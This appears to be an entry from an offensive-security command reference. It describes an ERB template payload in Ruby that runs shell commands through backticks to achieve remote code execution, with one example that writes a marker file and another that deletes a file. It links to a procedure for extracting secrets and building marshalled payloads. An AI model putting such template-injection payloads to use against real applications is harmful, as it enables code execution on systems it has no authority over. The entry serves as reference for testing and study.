---
data: erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
tags:
  - erb
  - rce
type: command
executor: ruby
platforms:
  - Linux
id: f7188506-6cfa-4c3b-a8f3-9aec869fc2c1
created_at: '2025-12-11T03:47:59.280Z'
updated_at: '2025-12-11T03:47:59.280Z'
verified: false
validated: true
submitted: true
---
# erb-payload-create

## Command

```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

## Description

Creates an ERB object with a template that executes a shell command via backticks for RCE payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<%= `...` %>` | Shell command to execute | Yes |

## Examples

### Basic Usage

```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

### Advanced Usage

```ruby
erb =ERB.new("<%= `rm /tmp/file` %>")
```

## Expected Output

ERB object with command template.

## Related

- [[commands/deprecation-proxy-create]]
- [[procedures/Extract-Secrets-and-Generate-Marshalled-Payload]]
